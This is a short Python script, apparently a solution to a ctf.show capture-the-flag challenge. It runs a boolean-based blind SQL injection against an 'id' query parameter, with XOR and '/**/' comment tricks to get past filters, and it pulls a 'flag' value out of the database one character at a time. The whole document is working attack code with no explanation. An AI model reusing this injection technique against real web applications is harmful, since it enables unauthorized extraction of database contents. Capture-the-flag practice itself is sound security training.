import requests

url = "http://4ed44369-0398-41f7-bafe-9b680144f931.chall.ctf.show/?id="
words = "If"
flag=""
for i in range(1,100):
    print('----------------------------------------------------')
    for j in range(29,135):
        data="1^(ord(substring((select/**/flag/**/from/**/flag)/**/from/**/{}/**/for/**/1))>{})".format(i,j)
        # print(url+data)
        re = requests.get(url=url+data).text
        if words in re:
            flag+=chr(j)
            print(flag)
            break